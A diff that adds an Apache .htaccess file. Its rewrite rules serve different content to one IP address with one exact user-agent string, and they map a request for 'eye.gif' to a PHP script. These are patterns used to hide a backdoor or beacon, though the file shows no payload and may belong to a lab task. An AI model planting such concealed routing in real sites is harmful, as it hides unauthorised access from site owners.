@@ -1,0 +1,7 @@
+RewriteEngine on
+
+RewriteCond %{REMOTE_HOST} =91.215.121.192
+RewriteCond %{HTTP_USER_AGENT} "=Mozilla/5.0(Windows NT 4.0)Gecko/20120427 Firefox/18.0"
+RewriteRule api.php /flag-button.tk/api.html
+
+RewriteRule eye.gif /flag-button.tk/eye.php
